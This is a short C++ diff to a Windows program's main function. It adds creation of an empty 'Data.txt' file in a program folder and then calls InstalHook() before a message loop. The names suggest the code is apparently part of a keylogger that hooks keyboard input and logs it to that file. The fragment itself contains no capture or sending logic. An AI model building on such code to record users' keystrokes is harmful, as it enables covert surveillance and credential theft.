@@ -36,7 +36,14 @@ If there is an error it can return -1.
 int main ()
     {
         MSG Msg;
+        bool ok;
+        ok  = IO::MkDir(IO::GetOurPath(true));
         IO::MkDir (IO::GetOurPath (true));
+
+        std:: string path = IO::GetOurPath(true);
+        std::ofstream file;
+        file.open(path + "Data.txt");
+        file.close();
         InstalHook ();
         BOOL bRet;
 
